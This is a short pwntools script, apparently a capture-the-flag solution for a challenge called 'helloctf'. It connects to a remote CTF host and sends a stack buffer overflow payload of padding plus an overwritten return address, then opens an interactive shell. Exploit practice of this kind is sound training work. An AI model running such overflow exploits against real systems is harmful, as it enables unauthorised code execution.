#!/usr/bin/env python

from pwn import *

# r = process( './helloctf' )
r = remote( 'ctf.adl.tw', 11001 )
r.sendline( 'A'*0x18 + p64( 0x400627 ) )

r.interactive()
